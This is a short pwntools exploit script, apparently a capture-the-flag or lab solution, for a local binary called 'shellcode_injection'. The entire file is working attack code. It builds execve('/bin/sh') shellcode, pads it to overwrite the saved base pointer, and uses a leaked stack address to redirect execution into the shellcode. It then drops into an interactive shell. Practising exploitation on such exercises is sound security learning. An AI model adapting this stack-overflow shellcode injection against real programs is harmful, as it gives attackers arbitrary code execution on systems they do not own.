from pwn import *

context.terminal = ['tmux','splitw','-h'] # for gdb
context.arch = 'amd64' # wasted an hour for this one :(

#generate shellcode
shellcode = asm (
        shellcraft.execve('/bin/sh')
        )
shellcode_padded = shellcode + (b'a' * (
    0x212 #until rbp
    + 8   #overwrite saved rbp
    - len(shellcode)))

#open the program
program = process('./shellcode_injection')
#program = gdb.debug('./shellcode_injection')

#receive the leak
leak = program.readuntil(b'\n')[:-1]
rbp = int(leak, 16)
print(f"need to jmp to {hex(rbp - 0x212)}")

#generate the payload
payload = shellcode_padded + p64(rbp - 0x212)
print(payload)

#send the payload
program.send_raw(payload)
program.interactive()

